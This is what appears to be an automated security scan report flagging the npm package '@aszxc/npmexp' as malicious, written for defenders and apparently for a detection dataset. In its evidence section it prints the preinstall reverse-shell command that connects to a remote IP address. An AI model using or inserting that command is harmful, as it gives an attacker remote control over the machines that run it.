# NPM Package Security Analysis Report

## Package Information
- **Package Name:** `@aszxc/npmexp`
- **Version:** `1.0.1`
- **Scan Date:** 2025-12-21T01:12:37

---

## Final Security Verdict: **MALICIOUS** (Policy: Blocked)

**Risk Level:** SEV-1 (Critical) **CRITICAL**  
**Confidence Score:** 90.0%

### Executive Summary
Backdoor installation via preinstall script The detected behaviors have no legitimate justification based on the package's stated purpose.

---

## THREAT PROFILE

**ATTACK TYPES:** Backdoor Installation

**PRIMARY TACTICS:**
- Backdoor Installation

**KEY RISK FACTORS:**
- Backdoor installation via preinstall script

---

## EVIDENCE SUMMARY

### MALICIOUS INDICATORS DETECTED

#### 1. Backdoor Installation [CRITICAL]
**Description:** A preinstall script is used to establish a reverse shell connection to a remote server.

```bash
bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'
```

**Attack Chain:** The detected behaviors form a coherent attack chain: Backdoor installation -> Reverse shell connection

**Legitimacy Assessment:** The behavior of establishing a reverse shell connection to a remote server is not expected for a package named '@aszxc/npmexp'

---

## RECOMMENDATIONS

### Immediate Action
**DO NOT INSTALL - Remove immediately if already installed**

### Remediation Steps
1. Review package source code and dependencies
1. Report to npm security team if confirmed malicious

---

## TECHNICAL ANALYSIS DETAILS

**Behaviors Detected:** 1
**Risk Categories:** backdoor_installation
**Highest Detection Confidence:** 90.0%
**Verification Confidence:** 90.0%


---

*Analysis Version: v2.0*  
*Model: deepseek-coder-6.7b*  
*Ground Truth Label: malicious*
